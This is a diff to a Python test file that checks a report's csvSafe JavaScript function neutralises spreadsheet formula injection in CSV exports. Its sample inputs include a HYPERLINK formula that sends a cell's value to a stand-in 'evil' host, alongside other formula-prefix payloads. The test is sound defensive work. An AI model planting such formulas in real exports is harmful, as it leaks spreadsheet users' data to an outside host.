@@ -328,14 +328,17 @@ def test_csv_export_runs_every_cell_through_the_formula_guard(conn, tmp_path):
     assert "csvSafe(td.textContent.trim())" in page            # and it is actually used on each exported cell
 
 
-@pytest.mark.skipif(_shutil.which("node") is None, reason="node is not installed")
+_NODE = _shutil.which("node")      # resolved at import: the suite runs with an empty PATH (conftest)
+
+
+@pytest.mark.skipif(_NODE is None, reason="node is not installed")
 def test_csv_guard_neutralises_formula_prefixes(conn, tmp_path):
     """Executes the report's own JavaScript function, not a copy of it."""
     page = _report_page(conn, tmp_path)
     fn = _re.search(r"function csvSafe\(v\) \{.*?\n\}", page, _re.S).group(0)
     samples = ["=HYPERLINK(\"http://evil/?\"&A1)", "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1",
                "Plain title", "A1=B2", "10.0.0.1", "SQL injection", ""]
-    out = _subprocess.run(["node", "-e", fn + f"; console.log(JSON.stringify({_json.dumps(samples)}.map(csvSafe)))"],
+    out = _subprocess.run([_NODE, "-e", fn + f"; console.log(JSON.stringify({_json.dumps(samples)}.map(csvSafe)))"],
                           capture_output=True, text=True, check=True).stdout
     safe = _json.loads(out)
     assert safe[:6] == ["'" + x for x in samples[:6]]          # every formula starter gets a leading apostrophe
